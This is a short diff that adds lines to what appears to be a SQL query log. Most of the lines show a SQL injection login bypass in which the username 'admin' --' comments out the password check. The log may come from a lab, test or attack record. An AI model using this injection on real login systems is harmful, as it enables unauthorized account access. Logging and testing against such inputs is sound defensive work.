@@ -1,0 +1,8 @@
+SELECT * FROM users WHERE username='admin' AND password='admin123'
+SELECT * FROM users WHERE username='admin' AND password='admin123'
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+2026-03-07 17:16:14 ]| SELECT * FROM users WHERE username='admin' --' AND password='admin123'
+2026-03-07 17:21:39 | SELECT * FROM users WHERE username='admin' --' AND password='anything'
+2026-03-07 18:03:50 | SELECT * FROM users WHERE username='admin' --' AND password='anything'
